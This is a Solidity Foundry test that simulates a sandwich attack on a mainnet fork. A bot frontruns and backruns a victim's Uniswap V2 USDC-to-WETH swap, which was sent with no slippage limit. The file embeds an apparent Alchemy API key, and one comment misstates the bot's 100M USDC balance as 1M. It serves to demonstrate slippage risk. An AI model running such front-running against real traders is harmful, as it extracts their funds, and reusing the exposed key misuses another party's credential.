// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/interfaces/IERC20.sol";

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract SandwichTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IUniswapV2Pair pair = IUniswapV2Pair(PAIR);
    IUniswapV2Router router = IUniswapV2Router(ROUTER);
    IERC20 weth = IERC20(WETH);
    IERC20 usdc = IERC20(USDC);

    address bot = address(0x1);
    address victim = address(0x2);

    address[] path;

    function setUp() public {
        vm.createSelectFork(
            "https://eth-mainnet.g.alchemy.com/v2/mOHE91YaQ03Fnpe76qa42"
        );

        path = new address[](2);
        path[0] = USDC;
        path[1] = WETH;

        // give bot and victim USDC
        deal(address(usdc), bot, 100_000_000e6); // bot has 1M USDC
        deal(address(usdc), victim, 10_000e6); // victim has 10k USDC
    }




function testSandwichAttack() public {
    uint botInitial = usdc.balanceOf(bot);
    console.log("Bot starting USDC :", botInitial / 1e6);

    // Victim expected output (before attack)
    vm.startPrank(victim);
    uint[] memory expected = router.getAmountsOut(10_000e6, path);
    console.log("Victim expected WETH (no attack):", expected[1] / 1e18);
    vm.stopPrank();

    // ==================== BOT FRONTRUN ====================
    vm.startPrank(bot);
    usdc.approve(address(router), type(uint256).max);

    uint frontUsdc = 4_500_000e6;   // Adjust this value to optimize sandwich

    uint[] memory front = router.swapExactTokensForTokens(
        frontUsdc,
        0,
        path,
        bot,
        block.timestamp + 15 minutes
    );

    uint wethBought = front[1];
    console.log("Bot frontrun WETH :", wethBought / 1e18);
    vm.stopPrank();

    // ==================== VICTIM TRADE (Vulnerable) ====================
    vm.startPrank(victim);
    usdc.approve(address(router), type(uint256).max);

    uint[] memory victimTrade = router.swapExactTokensForTokens(
        10_000e6,
        0,                          // amountOutMin = 0 → Vulnerable!
        path,
        victim,
        block.timestamp + 15 minutes
    );

    console.log("Victim received WETH after sandwich:", victimTrade[1] / 1e18);
    vm.stopPrank();

    // ==================== BOT BACKRUN ====================
    vm.startPrank(bot);
    address[] memory backPath = new address[](2);
    backPath[0] = WETH;
    backPath[1] = USDC;

    weth.approve(address(router), type(uint256).max);

    if (wethBought > 0) {
        router.swapExactTokensForTokens(
            wethBought,
            0,
            backPath,
            bot,
            block.timestamp + 15 minutes
        );
    }

    uint botFinal = usdc.balanceOf(bot);
    
    console.log("\n=== FINAL RESULTS ===");
    console.log("Bot final USDC   :", botFinal / 1e6);

    if (botFinal >= botInitial) {
        uint profit = botFinal - botInitial;
        console.log(" Bot Profit    :", profit / 1e6, "USDC");
    } else {
        uint loss = botInitial - botFinal;
        console.log(" Bot Loss      :", loss / 1e6, "USDC");
    }

    vm.stopPrank();
}
}